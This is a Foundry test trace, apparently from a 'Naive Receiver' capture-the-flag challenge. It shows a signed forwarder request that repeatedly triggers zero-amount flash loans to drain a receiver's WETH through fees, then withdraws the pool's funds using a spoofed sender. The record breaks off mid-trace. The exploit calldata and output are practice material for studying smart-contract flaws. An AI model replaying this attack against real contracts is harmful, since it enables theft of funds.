<span class="na">WETH in recovery</span><span class="pi">:</span> <span class="s">1010 WETH (successfully rescued all funds)</span>

<span class="na">Using Foundry  to run testCase(o/p)</span><span class="pi">:</span>

<span class="s">Ran 1 test for test/naive-receiver/NaiveReceiver.t.sol:NaiveReceiverChallenge</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_naiveReceiver() (gas</span><span class="pi">:</span> <span class="s">477289)</span>
<span class="na">Traces</span><span class="pi">:</span>
  <span class="pi">[</span><span class="nv">601877</span><span class="pi">]</span> <span class="s">NaiveReceiverChallenge::test_naiveReceiver()</span>
    <span class="s">├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x44E97aF4418b7a17AABD8090bEA0A471a366305C</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [2823] BasicForwarder::nonces(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [599] BasicForwarder::domainSeparator() [staticcall]</span>
    <span class="s">│   └─ ← [Return] 0x195a83794daaa3fd456b03f6e4648d959ea3719c9fbdd4a111541654d5c613b2</span>
    <span class="s">├─ [5020] BasicForwarder::getDataHash(Request({ from</span><span class="err">:</span> <span class="s">0x44E97aF4418b7a17AABD8090bEA0A471a366305C, target</span><span class="err">:</span> <span class="s">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, value</span><span class="err">:</span> <span class="s">0, gas</span><span class="err">:</span> <span class="s">1073681376 [1.073e9], nonce</span><span class="err">:</span> <span class="s">0, data</span><span class="err">:</span> <span class="s">0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000b0000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000003600000000000000000000000000000000000000000000000000000000000000460000000000000000000000000000000000000000000000000000000000000056000000000000000000000000000000000000000000000000000000000000006600000000000000000000000000000000000000000000000000000000000000760000000000000000000000000000000000000000000000000000000000000086000000000000000000000000000000000000000000000000000000000000009600000000000000000000000000000000000000000000000000000000000000a600000000000000000000000000000000000000000000000000000000000000b6000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000002307800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006400f714ce000000000000000000000000000000000000000000000036c090d0ca6888000000000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea000000000000000000000000ae0bdc4eeac5e950b67c6819b118761caaf6194600000000000000000000000000000000000000000000000000000000, deadline</span><span class="err">:</span> <span class="s">86400 [8.64e4] })) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 0x448a3f9e902fd8dd1a91bcf095dd9647dac6f45566882719efffe49c1dd8fdf7</span>
    <span class="s">├─ [0] VM::sign("&lt;pk&gt;", 0x98966e1e9df3f5206507a3621d8d596c3022186641015b3951e1b97144d72aa1) [staticcall]</span>
    <span class="s">│   └─ ← [Return] 27, 0x3351cb39b71d8f78dad7c7aab44673cf376a91c50356b7a8ca45d87c14c98ff6, 0x4b10319df483a324ac03a96f87ea38701964f8e26cf6a5a637078389b947fe80</span>
    <span class="s">├─ [527949] BasicForwarder::execute(Request({ from</span><span class="err">:</span> <span class="s">0x44E97aF4418b7a17AABD8090bEA0A471a366305C, target</span><span class="err">:</span> <span class="s">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, value</span><span class="err">:</span> <span class="s">0, gas</span><span class="err">:</span> <span class="s">1073681376 [1.073e9], nonce</span><span class="err">:</span> <span class="s">0, data</span><span class="err">:</span> <span class="s">0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000b0000000000000000000000000000000000000000000000000000000000000160000000000000000000000000000000000000000000000000000000000000026000000000000000000000000000000000000000000000000000000000000003600000000000000000000000000000000000000000000000000000000000000460000000000000000000000000000000000000000000000000000000000000056000000000000000000000000000000000000000000000000000000000000006600000000000000000000000000000000000000000000000000000000000000760000000000000000000000000000000000000000000000000000000000000086000000000000000000000000000000000000000000000000000000000000009600000000000000000000000000000000000000000000000000000000000000a600000000000000000000000000000000000000000000000000000000000000b6000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000230780000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c45cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000002307800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000006400f714ce000000000000000000000000000000000000000000000036c090d0ca6888000000000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea000000000000000000000000ae0bdc4eeac5e950b67c6819b118761caaf6194600000000000000000000000000000000000000000000000000000000, deadline</span><span class="err">:</span> <span class="s">86400 [8.64e4] }), 0x3351cb39b71d8f78dad7c7aab44673cf376a91c50356b7a8ca45d87c14c98ff64b10319df483a324ac03a96f87ea38701964f8e26cf6a5a637078389b947fe801b)</span>
    <span class="s">│   ├─ [373] NaiveReceiverPool::trustedForwarder() [staticcall]</span>
    <span class="s">│   │   └─ ← [Return] BasicForwarder</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264</span><span class="pi">]</span>
    <span class="s">│   ├─ [3000] PRECOMPILES::ecrecover(0x98966e1e9df3f5206507a3621d8d596c3022186641015b3951e1b97144d72aa1, 27, 23212472500503303283916190069849825222867664427246845595418244297757926461430, 33952075640814404360023555046328832035072183034039714461156042761591782375040) [staticcall]</span>
    <span class="s">│   │   └─ ← [Return] 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c</span>
    <span class="s">│   ├─ [490015] NaiveReceiverPool::multicall([0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x5cffe9de0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000023078000000000000000000000000000000000000000000000000000000000000, 0x00f714ce000000000000000000000000000000000000000000000036c090d0ca6888000000000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea000000000000000000000000ae0bdc4eeac5e950b67c6819b118761caaf61946])</span>
    <span class="s">│   │   ├─ [69376] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [7607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="s">│   │   │   │   ├─ emit Transfer(from</span><span class="na">: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [30931] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [25102] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [10210] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   ├─ [26831] FlashLoanReceiver::onFlashLoan(BasicForwarder: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 1000000000000000000 [1e18], 0x3078)</span>
    <span class="s">│   │   │   │   ├─ [570] NaiveReceiverPool::weth() [staticcall]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span>
    <span class="s">│   │   │   │   ├─ [23002] WETH::approve(NaiveReceiverPool: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], 1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   │   ├─ emit Approval(owner: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">spender: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9</span>
    <span class="s">│   │   │   ├─ [4610] WETH::transferFrom(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], NaiveReceiverPool</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FlashLoanReceiver</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: NaiveReceiverPool</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">1000000000000000000 [1e18])</span>
    <span class="s">│   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001</span>
    <span class="s">│   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   ├─ [41076] NaiveReceiverPool::flashLoan(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], WETH</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x3078) [delegatecall]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(FlashLoanReceiver: [0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50], 0)</span>
